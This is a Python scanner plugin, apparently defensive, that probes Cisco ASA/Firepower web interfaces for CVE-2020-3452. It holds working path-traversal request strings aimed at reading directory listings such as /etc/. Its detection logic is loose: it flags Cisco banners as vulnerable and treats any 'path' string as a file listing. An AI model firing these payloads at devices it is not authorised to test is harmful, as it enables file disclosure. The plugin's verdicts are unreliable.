"""
Plugin 1094: Cisco ASA / Firepower Path Traversal (CVE-2020-3452)
===================================================================
Detects path traversal in Cisco ASA and Firepower web services interface.
Real CVE: CVE-2020-3452 (CVSS 7.5)
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class CiscoAsaPathTraversalDetection(NaslPlugin):
    PLUGIN_ID = 1094
    NAME = 'Cisco ASA / Firepower Path Traversal'
    FAMILY = 'Firewalls'
    CVSS_SCORE = 7.5
    DESCRIPTION = (
        'Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD) '
        'before 9.6.4.42, 9.7.x, 9.8.x, 9.9.x, 9.10.x, 9.12.x, 9.13.x, and 9.14.x '
        'allows unauthenticated path traversal via the web services interface. An '
        'attacker can read arbitrary files on the device.'
    )
    SOLUTION = (
        'Upgrade to a fixed Cisco ASA/FTD version. Disable the webvpn and web '
        'interface if not needed. Block external access to the device management '
        'interface.'
    )
    CVE = ['CVE-2020-3452']
    PORTS = [443, 8443, 80, 8080]

    CISCO_PATHS = [
        '/+CSCOE+/',
        '/+CSCOE+/saml-sp/metadata.xml',
        '/+CSCOE+/portal_inc.lua',
        '/+CSCOE+/win.js',
        '/+CSCOE+/logout.html',
    ]

    CISCO_TRAVERSAL_PATHS = [
        '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sess/..%00/..%00/..%00/..%00/etc/',
        '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sess/..%00/..%00/..%00/..%00/+CSCOE+/',
    ]

    CISCO_HINTS = [
        b'CSCOE',
        b'webvpn',
        b'Cisco',
        b'CISCO',
        b'webvpnconfig',
        b'saml-sp',
        b'WebVPN',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                    timeout=5
                )

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for path in self.CISCO_PATHS + self.CISCO_TRAVERSAL_PATHS:
                    req = (
                        f'GET {path} HTTP/1.1\r\n'
                        f'Host: {host_header}\r\n'
                        f'User-Agent: Centra/1.0\r\n'
                        f'Connection: close\r\n\r\n'
                    )
                    writer.write(req.encode())
                    await writer.drain()

                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk:
                                break
                            response += chunk
                            if len(response) > 8192:
                                break
                    except asyncio.TimeoutError:
                        pass

                    if response:
                        status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                        body_start = response.find(b'\r\n\r\n')
                        body = response[body_start + 4:] if body_start != -1 else b''
                        body_str = body.decode('utf-8', errors='ignore')

                        is_200 = b'200 OK' in response[:50]
                        cisco_hits = [h for h in self.CISCO_HINTS if h in response]

                        file_list = b'file_list.json' in response or b'path' in response
                        saml_metadata = b'EntityDescriptor' in body or b'metadata.xml' in body

                        if is_200 and (cisco_hits or saml_metadata or file_list):
                            traversal_works = path in self.CISCO_TRAVERSAL_PATHS and is_200
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity='high',
                                description=(
                                    f'Cisco ASA/FTD detected on port {port_to_check} — '
                                    f'path traversal possible (CVE-2020-3452)'
                                ),
                                solution=self.SOLUTION,
                                evidence=(
                                    f'Path: {path}, Status: {status_line}, '
                                    f'Cisco hints: {cisco_hits}, '
                                    f'Traversal accessible: {traversal_works}'
                                ),
                                references=[
                                    'https://nvd.nist.gov/vuln/detail/CVE-2020-3452',
                                    'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asa-ftd-path-TRA-9xYKkzV',
                                ]
                            ))
                            break

                writer.close()
                await writer.wait_closed()

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Cisco ASA/FTD path traversal indicators detected'
            ))

        return results
